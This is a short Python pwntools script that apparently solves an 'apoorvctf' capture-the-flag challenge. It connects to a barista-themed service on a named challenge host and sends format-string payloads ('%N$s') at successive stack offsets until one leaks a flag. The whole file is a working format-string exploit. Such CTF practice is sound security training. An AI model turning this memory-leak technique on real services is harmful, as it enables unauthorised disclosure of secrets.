from pwn import *

def send(host: str, port: str, payload: str) -> str:
    result = ""
    with remote(host, port) as r:
        r.recvuntil(b"Barista: 'What will you have?'")
        r.sendline(payload)
        r.recvuntil(payload)
        result = r.recvall().decode().strip()
    return result

def solution(host: str, port: str) -> str:
    flag = ""
    context.update({"arch":"i386","log_level":"error"})
    for index in range(10):
        result = send(host, port, f"%{index}$s".encode())
        brace_index = result.find("{")
        if brace_index >= 0:
            flag = "apoorvctf" + result[brace_index:]
            break
    return flag

if __name__ == "__main__":
    host = "chals1.apoorvctf.xyz"
    port = "3003"
    print(solution(host, port))
    